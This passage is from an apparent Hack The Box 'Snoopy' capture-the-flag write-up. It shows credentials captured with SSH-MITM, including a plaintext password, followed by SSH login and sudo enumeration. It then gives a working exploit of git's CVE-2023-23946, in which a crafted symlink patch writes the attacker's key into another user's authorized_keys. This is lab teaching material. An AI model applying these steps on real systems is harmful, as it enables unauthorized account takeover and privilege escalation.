<span class="err">âââââââââââââââââââââââââââââââââââââââââââââââ</span><span class="w"> </span><span class="nx">SSH</span><span class="o">-</span><span class="nx">MITM</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">ssh</span><span class="w"> </span><span class="nx">audits</span><span class="w"> </span><span class="nx">made</span><span class="w"> </span><span class="nx">simple</span><span class="w"> </span><span class="err">âââââââââââââââââââââââââââââââââââââââââââââââ</span>
<span class="nx">Version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">4.0.0</span>
<span class="nx">License</span><span class="p">:</span><span class="w"> </span><span class="nx">GNU</span><span class="w"> </span><span class="nx">General</span><span class="w"> </span><span class="nx">Public</span><span class="w"> </span><span class="nx">License</span><span class="w"> </span><span class="nx">v3</span><span class="m m-Double">.0</span>
<span class="nx">Documentation</span><span class="p">:</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//docs.ssh-mitm.at</span>
<span class="nx">Issues</span><span class="p">:</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/ssh-mitm/ssh-mitm/issues</span>
<span class="err">âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ</span>
<span class="nx">generated</span><span class="w"> </span><span class="nx">temporary</span><span class="w"> </span><span class="nx">RSAKey</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="mi">2048</span><span class="w"> </span><span class="nx">bit</span><span class="w"> </span><span class="nx">length</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">fingerprints</span><span class="p">:</span>
<span class="w">   </span><span class="nx">MD5</span><span class="p">:</span><span class="nx">c1</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">7</span><span class="nx">b</span><span class="p">:</span><span class="nx">cc</span><span class="p">:</span><span class="nx">ee</span><span class="p">:</span><span class="mi">5</span><span class="nx">b</span><span class="p">:</span><span class="nx">a6</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">6</span><span class="nx">e</span><span class="p">:</span><span class="nx">a6</span><span class="p">:</span><span class="nx">cd</span><span class="p">:</span><span class="nx">d0</span><span class="p">:</span><span class="nx">d5</span><span class="p">:</span><span class="mi">98</span><span class="p">:</span><span class="mi">4</span><span class="nx">e</span><span class="p">:</span><span class="nx">c6</span>
<span class="w">   </span><span class="nx">SHA256</span><span class="p">:</span><span class="nx">VK</span><span class="o">/</span><span class="nx">dOzKM0OHr3</span><span class="o">+</span><span class="nx">S77Xm1i</span><span class="o">+</span><span class="nx">fISImnqYPL3bgmEMR6Tgw</span>
<span class="w">   </span><span class="nx">SHA512</span><span class="p">:</span><span class="nx">m5gQ</span><span class="o">+</span><span class="nx">BPlhzceeJ057S6wJLNXfyFK</span><span class="o">/</span><span class="mi">2</span><span class="nx">ALxWMEn65K3Sq54St9m8iPdmAIIZ3qldDlqLJKFsJdA3QodyfjzKIlHQ</span>
<span class="nx">listen</span><span class="w"> </span><span class="nx">interfaces</span><span class="w"> </span><span class="m m-Double">0.0.0.0</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="mi">2222</span>
<span class="err">ââââââââââââââââââââââââââââââââââââââââââââââââââââ</span><span class="w"> </span><span class="nx">waiting</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">connections</span><span class="w"> </span><span class="err">ââââââââââââââââââââââââââââââââââââââââââââââââââââ</span>
</code></pre><br style="line-height: 0.5;"/></div>

We send the request again, filling in the appropriate data in the form displayed when executing the <code>/server_provision</code> command:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/14.png"/><br/><br/>
We receive the request on our server and successfully filter credentials belonging to the user <code>cbrown</code>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/15.png"/><br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="o">:</span><span class="n">sn00pedcr3dential</span><span class="o">!!!</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Next, we will verify if these credentials belong to the user <code>cbrown</code> at the system level on the victim machine. We will try connecting through the SSH service:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">cbrown</span><span class="mf">@10.10.11.212</span>
<span class="n">The</span><span class="w"> </span><span class="n">authenticity</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="err">'</span><span class="mf">10.10.11.212</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.11.212</span><span class="p">)</span><span class="err">'</span><span class="w"> </span><span class="n">can</span><span class="err">'</span><span class="n">t</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">established</span><span class="p">.</span>
<span class="n">ED25519</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">SHA256</span><span class="o">:</span><span class="n">XCYXaxdk</span><span class="o">/</span><span class="n">Kqjbrpe8gktW9N6</span><span class="o">/</span><span class="mi">6</span><span class="n">egnc</span><span class="o">+</span><span class="n">Dy9V6SiBp4XY</span><span class="p">.</span>
<span class="n">This</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">names</span><span class="p">.</span>
<span class="n">Are</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">sure</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="n">connecting</span><span class="w"> </span><span class="p">(</span><span class="n">yes</span><span class="o">/</span><span class="n">no</span><span class="o">/</span><span class="p">[</span><span class="n">fingerprint</span><span class="p">])</span><span class="o">?</span><span class="w"> </span><span class="n">yes</span>
<span class="nl">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Permanently</span><span class="w"> </span><span class="n">added</span><span class="w"> </span><span class="err">'</span><span class="mf">10.10.11.212</span><span class="err">'</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">hosts</span><span class="p">.</span>
<span class="n">cbrown</span><span class="mf">@10.10.11.212</span><span class="err">'</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span>
<span class="n">Welcome</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mf">22.04.2</span><span class="w"> </span><span class="n">LTS</span><span class="w"> </span><span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="mf">5.15.0</span><span class="mi">-71</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="n">x86_64</span><span class="p">)</span>

<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Documentation</span><span class="o">:</span><span class="w">  </span><span class="n">https</span><span class="o">:</span><span class="c1">//help.ubuntu.com</span>
<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Management</span><span class="o">:</span><span class="w">     </span><span class="n">https</span><span class="o">:</span><span class="c1">//landscape.canonical.com</span>
<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Support</span><span class="o">:</span><span class="w">        </span><span class="n">https</span><span class="o">:</span><span class="c1">//ubuntu.com/advantage</span>

<span class="n">This</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">minimized</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">removing</span><span class="w"> </span><span class="n">packages</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">are</span>
<span class="n">not</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="n">into</span><span class="p">.</span>

<span class="n">To</span><span class="w"> </span><span class="n">restore</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="err">'</span><span class="n">unminimize</span><span class="err">'</span><span class="w"> </span><span class="n">command</span><span class="p">.</span>
<span class="n">Failed</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>

<span class="n">cbrown</span><span class="p">@</span><span class="n">snoopy</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

We successfully access the system as the user <code>cbrown</code>.<br/><br/>
<h3><br>Shell as sbrown</br></h3><br>
Performing a basic enumeration with the user <code>cbrown</code>, when listing the sudo privileges, we observe the following:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
<span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">cbrown</span><span class="p">:</span><span class="w"> </span>
<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">cbrown</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="nl">snoopy</span><span class="p">:</span>
<span class="w">    </span><span class="n">env_keep</span><span class="o">+=</span><span class="ss">"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET"</span><span class="p">,</span><span class="w"> </span><span class="n">env_keep</span><span class="o">+=</span><span class="ss">"XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"</span><span class="p">,</span>
<span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">bin</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span>

<span class="k">User</span><span class="w"> </span><span class="n">cbrown</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="nl">snoopy</span><span class="p">:</span>
<span class="w">    </span><span class="p">(</span><span class="n">sbrown</span><span class="p">)</span><span class="w"> </span><span class="nl">PASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">git</span><span class="w"> </span><span class="o">^</span><span class="n">apply</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">[</span><span class="n">a-zA-Z0-9.</span><span class="o">]+</span><span class="err">$</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

We have the privilege to execute <code>git apply -v</code> on any file.<br/><br/>
If we attempt to search for <code>.git</code> files on the system, we notice that there are none, at least that we can access as the user <code>cbrown</code>.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="ss">"*.git"</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

If we list the version of <code>git</code>, it shows us that it's <code>2.34.1</code>.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="o">--</span><span class="n">version</span>
<span class="n">git</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="mf">2.34.1</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Searching a bit on the internet, I found a security advisory for <a href="https://chat.openai.com/c/GHSA-r87m-v37r-cwfh">git</a>.<br/><br/>
Additionally, I came across an <a href="https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/">article</a> that explains two vulnerabilities in <code>git</code>, including the one we are interested in, <code>CVE-2023-23946</code>.<br/><br/>
<h3><br><a href="https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/">CVE-2023-23946</a></br></h3><br>
<em>Git allows for applying arbitrary patches to your repositoryâs history with <code>git apply</code>. In order to prevent malicious patches from creating files outside of the working copy, <code>git apply</code> rejects patches which attempt to write a file beyond a symbolic link.</em><br/><br/>
<em>However, this mechanism can be tricked when the malicious patch creates that symbolic link in the first place. This can be leveraged to write arbitrary files on a victimâs filesystem when applying malicious patches from untrusted sources.</em><br/><br/>
It appears that the vulnerability may allow us to create files through patch application by abusing symbolic links. In this <a href="https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd">commit</a>, you can see how the vulnerability works.<br/><br/>
Inspecting the commit further, we can see in <a href="https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd#diff-d37fceb39eb9394533430ff8956cad41dd7f9233672dc778fd5690625906069f">t/t4115-apply-symlink.sh</a> how it could potentially be exploited:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/17.png"/><br/><br/>
This theoretically shouldn't work anymore, but since the vulnerability applies to the version of <code>git</code> present on the machine, we can try it.<br/><br/>
My idea is that if I can overwrite files as the user who runs the <code>git</code> program, which in our case is <code>sbrown</code> (as we execute it with sudo), I could try to modify the <code>authorized_keys</code> file to host my SSH public key and then connect without providing a password as the <code>sbrown</code> user.<br/><br/>
First, I will navigate to the home directory of the <code>cbrown</code> user and create a directory where I will initialize a <code>git</code> repository:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">mkdir</span><span class="w"> </span><span class="n">repo</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="err">!$</span>
<span class="n">cd</span><span class="w"> </span><span class="n">repo</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="n">init</span>
<span class="nl">hint</span><span class="p">:</span><span class="w"> </span><span class="k">Using</span><span class="w"> </span><span class="s1">'master'</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">initial</span><span class="w"> </span><span class="n">branch</span><span class="p">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="n">name</span>
<span class="nl">hint</span><span class="p">:</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">subject</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">change</span><span class="p">.</span><span class="w"> </span><span class="k">To</span><span class="w"> </span><span class="n">configure</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">initial</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="ow">all</span>
<span class="nl">hint</span><span class="p">:</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">repositories</span><span class="p">,</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">suppress</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">warning</span><span class="p">,</span><span class="w"> </span><span class="k">call</span><span class="err">:</span>
<span class="nl">hint</span><span class="p">:</span><span class="w"> </span>
<span class="nl">hint</span><span class="p">:</span><span class="w">   </span><span class="n">git</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">--</span><span class="k">global</span><span class="w"> </span><span class="n">init</span><span class="p">.</span><span class="n">defaultBranch</span><span class="w"> </span><span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span>
<span class="nl">hint</span><span class="p">:</span><span class="w"> </span>
<span class="nl">hint</span><span class="p">:</span><span class="w"> </span><span class="k">Names</span><span class="w"> </span><span class="n">commonly</span><span class="w"> </span><span class="n">chosen</span><span class="w"> </span><span class="n">instead</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="s1">'master'</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="s1">'main'</span><span class="p">,</span><span class="w"> </span><span class="s1">'trunk'</span><span class="w"> </span><span class="ow">and</span>
<span class="nl">hint</span><span class="p">:</span><span class="w"> </span><span class="s1">'development'</span><span class="p">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">just</span><span class="o">-</span><span class="n">created</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">renamed</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="nl">command</span><span class="p">:</span>
<span class="nl">hint</span><span class="p">:</span><span class="w"> </span>
<span class="nl">hint</span><span class="p">:</span><span class="w">   </span><span class="n">git</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span>
<span class="n">Initialized</span><span class="w"> </span><span class="n">empty</span><span class="w"> </span><span class="n">Git</span><span class="w"> </span><span class="n">repository</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cbrown</span><span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="p">.</span><span class="n">git</span><span class="o">/</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Now, what I'll do is create a <code>patch</code> file with the following content:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">patch</span>
<span class="n">diff</span><span class="w"> </span><span class="o">--</span><span class="n">git</span><span class="w"> </span><span class="n">a</span><span class="o">/</span><span class="n">symlink</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">renamed</span><span class="o">-</span><span class="n">symlink</span>
<span class="n">similarity</span><span class="w"> </span><span class="k">index</span><span class="w"> </span><span class="mi">100</span><span class="o">%</span>
<span class="n">rename</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">symlink</span>
<span class="n">rename</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">renamed</span><span class="o">-</span><span class="n">symlink</span>
<span class="o">--</span>
<span class="n">diff</span><span class="w"> </span><span class="o">--</span><span class="n">git</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">renamed</span><span class="o">-</span><span class="n">symlink</span><span class="o">/</span><span class="k">create</span><span class="o">-</span><span class="n">me</span>
<span class="k">new</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="mi">100644</span>
<span class="k">index</span><span class="w"> </span><span class="mf">0000000..039727</span><span class="n">e</span>
<span class="o">---</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
<span class="o">+++</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">renamed</span><span class="o">-</span><span class="n">symlink</span><span class="o">/</span><span class="n">authorized_keys</span>
<span class="err">@@</span><span class="w"> </span><span class="o">-</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="w"> </span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w"> </span><span class="err">@@</span>
<span class="o">+</span><span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span><span class="w"> </span><span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABgQCa6hDzoA45r9L4AJpWuoavTDD7Cu2m2eh9Q</span><span class="o">+</span><span class="n">ux</span><span class="o">+</span><span class="n">BlvbhjaXXlaVtsmRywUCkiTUhfaIR7KdxY6QTlf8dMNBQA54xmjwjC0YFVTy50keR6VIvO8SCMt2g</span><span class="o">/</span><span class="n">icoAn0yN4LbSNphTuz8AXwEaHH</span><span class="o">/</span><span class="n">DyCezQiAp9PecYmLcFDqnPnLb43bIzzsvXGbDPCWeJPfcotaIubwZkqjwOaKZu8pXZa66wXnFrttD8MC8d</span><span class="o">+</span><span class="n">l9gI3zRwOyds6msJdzPOXDaEPoly1is6i8w5</span><span class="o">/</span><span class="n">AkmLDkyg2aVxZS4RpOg3DnzGnAZ7yAtzI1DXbfC3zWwVVDLhtDCF8TdR4zqWG287mljXrtDWKUN1dB</span><span class="o">/</span><span class="n">H8gUF8tti7EuYigevMXOCRtZFGUJb7VlzqNzM9b9AQLzmuBviT7VtC</span><span class="o">/</span><span class="n">Uip9k</span><span class="o">+</span><span class="n">QN5v9RHT</span><span class="o">/</span><span class="n">xph6riM2XGCb4dLxbXRj6BorMoLAVKduzg9Ys2lL46aPaUEWtmmkDAa673kB8idiR3EXuxZGfDM2kDR6p6o590wsfO0h9LfotnyE</span><span class="o">=</span><span class="w"> </span><span class="n">elswix</span><span class="nv">@kali</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

As we can see, I used what was shown in <a href="https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd#diff-d37fceb39eb9394533430ff8956cad41dd7f9233672dc778fd5690625906069f">t/t4115-apply-symlink.sh</a> and replaced the string <code>busted</code> with my SSH public key.<br/><br/>
Remember that this will work through the use of symbolic links, so we first need to create a symbolic link with the name <code>symlink</code> and make it point to the path where we want to overwrite the <code>authorized_keys</code> file (as indicated in the line <code>+++ b/renamed-symlink/authorized_keys</code>), which in our case is <code>/home/sbrown/.ssh</code>.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span><span class="k">ln</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sbrown</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="w"> </span><span class="n">symlink</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
<span class="n">total</span><span class="w"> </span><span class="mi">4</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">cbrown</span><span class="w"> </span><span class="n">cbrown</span><span class="w"> </span><span class="mi">831</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="n">patch</span>
<span class="n">lrwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">cbrown</span><span class="w"> </span><span class="n">cbrown</span><span class="w">  </span><span class="mi">17</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">10</span><span class="w"> </span><span class="n">symlink</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sbrown</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Supposedly, now when we execute the <code>git apply -v</code> command on the <code>patch</code> file as the <code>sbrown</code> user, the changes will be applied through the <code>symlink</code>, and since it points to the directory <code>/home/sbrown/.ssh</code>, the <code>authorized_keys</code> file will be overwritten in that path.<br/><br/>
Let's not forget to give write privileges to all users on our Repo directory and our user's home directory since we will run the command as <code>sbrown</code>, and it will make changes in our directory.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="mi">777</span><span class="w"> </span><span class="o">-</span><span class="n">R</span><span class="w"> </span><span class="p">.</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="mi">777</span><span class="w"> </span><span class="o">-</span><span class="n">R</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cbrown</span><span class="o">/</span>
</code></pre><br style="line-height: 0.5;"/></div>

Finally, we execute the command as the <code>sbrown</code> user:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">sbrown</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">git</span><span class="w"> </span><span class="n">apply</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="n">patch</span>
<span class="n">Checking</span><span class="w"> </span><span class="n">patch</span><span class="w"> </span><span class="n">symlink</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">renamed</span><span class="o">-</span><span class="n">symlink</span><span class="p">...</span>
<span class="n">Checking</span><span class="w"> </span><span class="n">patch</span><span class="w"> </span><span class="n">renamed</span><span class="o">-</span><span class="n">symlink</span><span class="o">/</span><span class="k">create</span><span class="o">-</span><span class="n">me</span><span class="p">...</span>
<span class="n">Applied</span><span class="w"> </span><span class="n">patch</span><span class="w"> </span><span class="n">symlink</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">renamed</span><span class="o">-</span><span class="n">symlink</span><span class="w"> </span><span class="n">cleanly</span><span class="p">.</span>
<span class="n">Applied</span><span class="w"> </span><span class="n">patch</span><span class="w"> </span><span class="n">renamed</span><span class="o">-</span><span class="n">symlink</span><span class="o">/</span><span class="k">create</span><span class="o">-</span><span class="n">me</span><span class="w"> </span><span class="n">cleanly</span><span class="p">.</span>
<span class="n">cbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">repo</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

